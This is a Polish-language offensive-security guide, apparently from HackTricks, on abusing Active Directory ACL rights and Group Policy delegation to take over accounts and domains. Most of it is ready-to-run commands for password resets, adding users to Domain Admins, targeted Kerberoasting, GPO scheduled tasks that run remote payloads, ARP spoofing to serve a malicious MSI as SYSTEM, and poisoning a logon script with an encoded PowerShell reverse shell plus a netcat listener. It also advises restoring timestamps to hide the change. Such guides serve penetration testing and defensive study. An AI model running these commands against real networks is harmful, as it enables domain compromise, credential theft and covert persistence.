# Nadużywanie ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest głównie podsumowaniem technik opisanych w** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **oraz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Więcej szczegółów można znaleźć w oryginalnych artykułach.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Uprawnienia GenericAll do użytkownika**

To uprawnienie zapewnia atakującemu pełną kontrolę nad docelowym kontem użytkownika. Po potwierdzeniu uprawnień `GenericAll` za pomocą polecenia `Get-ObjectAcl` atakujący może:

- **Zmienić hasło docelowego użytkownika**: Za pomocą `net user <username> <password> /domain` atakujący może zresetować hasło użytkownika.
- W systemie Linux można zrobić to samo przez SAMR za pomocą Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Jeśli konto jest wyłączone, wyczyść flagę UAC**: `GenericAll` umożliwia edycję `userAccountControl`. Z systemu Linux BloodyAD może usunąć flagę `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby można było przeprowadzić na nim Kerberoasting, a następnie użyj Rubeus i targetedKerberoast.py do wyodrębnienia i próby złamania hashy ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Wyłącz pre-authentication dla użytkownika, narażając jego konto na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mając `GenericAll` wobec użytkownika, możesz dodać poświadczenie oparte na certyfikacie i uwierzytelniać się jako ten użytkownik bez zmiany jego hasła. Zobacz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Uprawnienia GenericAll do grupy**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupach, jeśli ma on uprawnienia `GenericAll` do grupy takiej jak `Domain Admins`. Po zidentyfikowaniu distinguished name grupy za pomocą `Get-NetGroup` atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub modułów takich jak Active Directory albo PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Z systemu Linux możesz również wykorzystać BloodyAD, aby dodać się do dowolnych grup, gdy posiadasz uprawnienia GenericAll/Write wobec nich. Jeśli docelowa grupa jest zagnieżdżona w „Remote Management Users”, natychmiast uzyskasz dostęp WinRM do hostów respektujących tę grupę:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie obiektu komputera.
- **Shadow Credentials**: Użycie tej techniki do podszywania się pod konto komputera lub użytkownika poprzez wykorzystanie uprawnień do tworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma prawa `WriteProperty` do wszystkich obiektów dla określonej grupy (np. `Domain Admins`), może:

- **Add Themselves to the Domain Admins Group**: Możliwe poprzez połączenie poleceń `net user` i `Add-NetGroupUser`; ta metoda umożliwia eskalację uprawnień w domenie.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

To uprawnienie umożliwia attackerom dodawanie samych siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń, które bezpośrednio modyfikują członkostwo w grupie. Użycie poniższej sekwencji poleceń umożliwia dodanie siebie:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie pozwala atakującym bezpośrednio dodawać siebie do grup poprzez modyfikowanie właściwości grup, jeśli mają do nich uprawnienie `WriteProperty`. Potwierdzenie i wykonanie tego uprawnienia odbywa się za pomocą:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie uprawnienia `ExtendedRight` dla użytkownika `User-Force-Change-Password` umożliwia resetowanie haseł bez znajomości bieżącego hasła. Weryfikację tego uprawnienia i jego wykorzystanie można przeprowadzić za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, korzystając z kilku metod resetowania hasła użytkownika, w tym sesji interaktywnych i one-linerów dla środowisk nieinteraktywnych. Polecenia obejmują zarówno proste wywołania PowerShell, jak i użycie `rpcclient` w systemie Linux, co pokazuje różnorodność wektorów ataku.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Jeśli attacker odkryje, że ma prawa `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Jest to szczególnie istotne, gdy daną grupą jest `Domain Admins`, ponieważ zmiana właściciela zapewnia szerszą kontrolę nad atrybutami i członkostwem grupy. Proces obejmuje zidentyfikowanie właściwego obiektu za pomocą `Get-ObjectAcl`, a następnie użycie `Set-DomainObjectOwner` w celu zmodyfikowania właściciela — za pomocą SID lub nazwy.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite na użytkowniku**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkownika. W szczególności, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby uruchomić złośliwy skrypt podczas logowania użytkownika. Osiąga się to za pomocą polecenia `Set-ADObject`, aktualizując właściwość `scriptpath` docelowego użytkownika tak, aby wskazywała na skrypt atakującego.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Dzięki temu uprawnieniu atakujący mogą manipulować członkostwem w grupach, na przykład dodawać siebie lub innych użytkowników do określonych grup. Proces ten obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania lub usuwania użytkowników z grupy oraz weryfikowanie zmian członkostwa za pomocą poleceń PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Z systemu Linux narzędzie Samba `net` może dodawać/usuwać członków, gdy posiadasz `GenericWrite` w grupie (przydatne, gdy PowerShell/RSAT są niedostępne):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD oraz uprawnień `WriteDACL` do niego umożliwia atakującemu nadanie sobie uprawnień `GenericAll` do tego obiektu. Osiąga się to poprzez manipulację ADSI, co zapewnia pełną kontrolę nad obiektem i możliwość modyfikowania członkostwa w jego grupach. Mimo to podczas próby wykorzystania tych uprawnień za pomocą cmdletów `Set-Acl` / `Get-Acl` modułu Active Directory występują ograniczenia.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Szybkie przejęcie WriteDACL/WriteOwner (PowerView)

Gdy masz `WriteOwner` i `WriteDacl` dla użytkownika lub konta usługowego, możesz przejąć pełną kontrolę i zresetować jego hasło za pomocą PowerView bez znajomości starego hasła:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Uwagi:
- Jeśli masz tylko `WriteOwner`, może być konieczne wcześniejsze zmienienie właściciela na siebie:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Zweryfikuj dostęp za pomocą dowolnego protokołu (SMB/LDAP/RDP/WinRM) po zresetowaniu hasła.

## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje określone uprawnienia replikacji w domenie, aby naśladować kontroler domeny i synchronizować dane, w tym dane uwierzytelniające użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, umożliwiających atakującym wyodrębnianie poufnych informacji ze środowiska AD bez bezpośredniego dostępu do kontrolera domeny.<sup>[[5]](#references)</sup> [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegowany dostęp do zarządzania obiektami Group Policy (GPO) może stwarzać poważne zagrożenia bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` otrzyma delegowane prawa do zarządzania GPO, może posiadać uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Uprawnienia te mogą zostać wykorzystane do złośliwych celów, co można zidentyfikować za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Aby zidentyfikować nieprawidłowo skonfigurowane GPO, można połączyć cmdlety PowerSploit. Umożliwia to wykrycie GPO, którymi określony użytkownik ma uprawnienia zarządzać: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Możliwe jest ustalenie, do których komputerów ma zastosowanie określone GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Aby sprawdzić, jakie zasady są stosowane na konkretnym komputerze, można użyć poleceń takich jak `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identyfikację jednostek organizacyjnych (OU), których dotyczy dana zasada, można przeprowadzić za pomocą `Get-DomainOU`.

Do enumeracji GPO i wyszukiwania w nich problemów można również użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound).

### Abuse GPO - New-GPOImmediateTask

Nieprawidłowo skonfigurowane GPO mogą zostać wykorzystane do wykonywania kodu, na przykład poprzez utworzenie natychmiastowego zaplanowanego zadania. Można w ten sposób dodać użytkownika do lokalnej grupy administratorów na komputerach, których dotyczy dane GPO, znacznie podnosząc uprawnienia:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i łączenie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, w celu wykonywania backdoorów na komputerach, których to dotyczy. Ta metoda wymaga zaktualizowania GPO oraz zalogowania się użytkownika na komputerze, aby doszło do wykonania:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferuje metodę nadużywania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do utworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuszenie aktualizacji zasad

Aktualizacje GPO zazwyczaj odbywają się mniej więcej co 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, na komputerze docelowym można użyć polecenia `gpupdate /force`, aby wymusić natychmiastową aktualizację zasad. Polecenie to gwarantuje zastosowanie wszelkich modyfikacji GPO bez oczekiwania na kolejny automatyczny cykl aktualizacji.

### Pod maską

Podczas przeglądania Scheduled Tasks dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań, takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń w celu modyfikowania działania systemu lub eskalacji uprawnień.

Struktura zadania, przedstawiona w pliku konfiguracji XML wygenerowanym przez `New-GPOImmediateTask`, opisuje szczegóły zaplanowanego zadania, w tym polecenie, które ma zostać wykonane, oraz jego wyzwalacze. Plik ten pokazuje sposób definiowania i zarządzania zaplanowanymi zadaniami w ramach GPO, zapewniając metodę wykonywania dowolnych poleceń lub skryptów jako części egzekwowania zasad.

### Użytkownicy i grupy

GPO umożliwiają również modyfikowanie członkostwa użytkowników i grup w systemach docelowych. Bezpośrednia edycja plików zasad Users and Groups pozwala atakującym dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegowaniu uprawnień do zarządzania GPO, które pozwala modyfikować pliki zasad w celu dodawania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracji XML dla Users and Groups opisuje sposób implementacji tych zmian. Dodając wpisy do tego pliku, można nadać określonym użytkownikom podwyższone uprawnienia w dotkniętych systemach. Metoda ta zapewnia bezpośredni sposób eskalacji uprawnień poprzez manipulowanie GPO.

Ponadto można rozważyć dodatkowe metody wykonywania kodu lub utrzymywania persistence, takie jak wykorzystywanie skryptów logowania/wylogowania, modyfikowanie kluczy rejestru dla autorunów, instalowanie software za pomocą plików .msi lub edytowanie konfiguracji usług. Techniki te zapewniają różne możliwości utrzymywania dostępu i kontrolowania systemów docelowych poprzez nadużywanie GPO.

### WriteGPLink + przejmowanie ścieżki UNC (ARP spoofing)

`WriteGPLink` w ramach OU/domeny pozwala modyfikować atrybut `gPLink` docelowego kontenera i **wymusić zastosowanie istniejącego GPO** bez edytowania samego GPO. Staje się to interesujące, gdy połączone GPO odwołuje się już do zdalnej zawartości za pośrednictwem **ścieżek UNC** (`\\HOST\share\...`), ponieważ uwierzytelnieni użytkownicy mogą odczytywać **SYSVOL** i offline wyszukiwać zasady nadające się do ponownego wykorzystania.<sup>[[11]](#references)</sup>

Workflow wysokiego poziomu:

1. Użyj BloodHound, aby zidentyfikować principal z `WriteGPLink` w ramach OU oraz wyliczyć komputery/użytkowników znajdujących się w tej OU.
2. Sklonuj `SYSVOL` w trybie tylko do odczytu i przeanalizuj GPO, wyszukując **Software Installation**, **mapowania dysków** (`Drives.xml`) oraz **skrypty logowania/uruchamiania**, które odwołują się do ścieżek UNC.
3. Preferuj zasady wskazujące **bezpośredni hostname** (na przykład `\\DC02\share\pkg.msi`) zamiast ścieżek DFS/domain-namespace, ponieważ ścieżki oparte na hostname łatwiej przekierować za pomocą spoofingu L2.
4. Dodaj wybrany identyfikator GUID GPO do `gPLink` docelowej OU, aby ofiara przetworzyła tę już istniejącą zasadę.
5. W tej samej domenie rozgłoszeniowej wykonaj ARP spoofing hosta UNC i lokalnie przypisz jego adres IP (`ip addr add <target_ip>/32 dev <iface>`), aby ruch SMB ofiary dotarł do Twojego hosta.
6. Udostępnij oczekiwaną ścieżkę/nazwę pliku z serwera SMB atakującego (na przykład `smbserver.py`) i zaczekaj na normalne przetwarzanie zasad.

Przykład zbierania `SYSVOL` i korelacji GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Połącz istniejący GPO z docelowym OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Jeśli połączony GPO wdraża MSI ze ścieżki UNC, klient pobierze go podczas **uruchamiania komputera** i zainstaluje jako **`NT AUTHORITY\SYSTEM`**. Podszywając się pod wskazany host i udostępniając złośliwy MSI pod **tą samą nazwą udziału/ścieżki/pliku**, możesz przekształcić `WriteGPLink` w wykonanie kodu jako SYSTEM **bez modyfikowania SYSVOL**.

Ważne ograniczenia:

- **Czas ma znaczenie**: nowy link zostanie wykryty podczas odświeżania zasad (zwykle po około 90 minutach), ale **Software Installation** zazwyczaj uruchamia się podczas **restartu**.
- Windows Installer zazwyczaj śledzi wdrożenie za pomocą **`ProductCode`** pakietu. Jeśli produkt jest już zainstalowany, wdrożenie może zostać pominięte.
- Aby uniknąć odrzucenia przez instalator, zmodyfikuj złośliwy MSI tak, aby jego **`ProductCode`** i **`PackageCode`** odpowiadały wartościom oczekiwanym przez GPO dla legalnego pakietu.
- Stare pliki reklamowe `.aas` mogą pozostać w `SYSVOL`, dlatego przed poleganiem na wdrożeniu sprawdź, czy nadal wygląda ono na aktywne.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Mapowania dysków GPP w `Drives.xml` powodują, że użytkownicy uwierzytelniają się względem skonfigurowanej ścieżki UNC podczas logowania lub ponownego łączenia. Jeśli podszyjesz się pod wskazany host, możesz przechwycić **NetNTLMv2**. Jeśli SMB zostanie celowo doprowadzony do niepowodzenia, Windows może ponowić próbę za pośrednictwem **WebDAV**, wysyłając **NTLM over HTTP**, co zapewnia znacznie większą elastyczność podczas relay do **LDAP(S)**, **AD CS** lub **SMB**.

#### Logon/startup script UNC hijack

Ten sam wzorzec dotyczy skryptów hostowanych w UNC, znalezionych w `SYSVOL`:

- **Logon scripts** są zwykle wykonywane w kontekście **użytkownika**.
- **Startup scripts** są zwykle wykonywane w kontekście **komputera / SYSTEM**.

Jeśli ścieżka skryptu wskazuje na nazwę hosta, pod którą można się podszyć, przekieruj host UNC i udostępnij zastępczą zawartość skryptu z oczekiwanej lokalizacji.

## SYSVOL/NETLOGON Logon Script Poisoning

Ścieżki z prawem zapisu w `\\<dc>\SYSVOL\<domain>\scripts\` lub `\\<dc>\NETLOGON\` umożliwiają manipulowanie skryptami logowania wykonywanymi podczas logowania użytkownika za pośrednictwem GPO. Zapewnia to code execution w kontekście bezpieczeństwa logujących się użytkowników.

### Locate logon scripts
- Sprawdź atrybuty użytkownika pod kątem skonfigurowanego skryptu logowania:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Przeskanuj udziały domenowe w celu wykrycia skrótów lub odwołań do skryptów:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizuj pliki `.lnk`, aby ustalać cele wskazujące na SYSVOL/NETLOGON (przydatna sztuczka DFIR oraz rozwiązanie dla atakujących bez bezpośredniego dostępu do GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound wyświetla atrybut `logonScript` (scriptPath) w węzłach użytkowników, jeśli jest obecny.

### Validate write access (don’t trust share listings)
Automatyczne narzędzia mogą wskazywać SYSVOL/NETLOGON jako tylko do odczytu, ale bazowe ACL NTFS nadal mogą zezwalać na zapis. Zawsze testuj:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Jeśli rozmiar pliku lub mtime ulegnie zmianie, masz uprawnienia do zapisu. Zachowaj oryginały przed modyfikacją.

### Zatruj skrypt logowania VBScript na potrzeby RCE
Dodaj polecenie uruchamiające reverse shell PowerShell (wygenerowany na revshells.com) i zachowaj oryginalną logikę, aby uniknąć zakłócenia funkcji biznesowych:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Nasłuchuj na swoim hoście i czekaj na następne interaktywne logowanie:
```bash
rlwrap -cAr nc -lnvp 443
```
Uwagi:
- Wykonanie odbywa się przy użyciu tokenu użytkownika rejestrującego (nie SYSTEM). Zakres obejmuje łącze GPO (OU, site, domain), do którego stosuje się ten skrypt.
- Po użyciu przywróć oryginalną zawartość i znaczniki czasu.


## Referencje

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts and Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
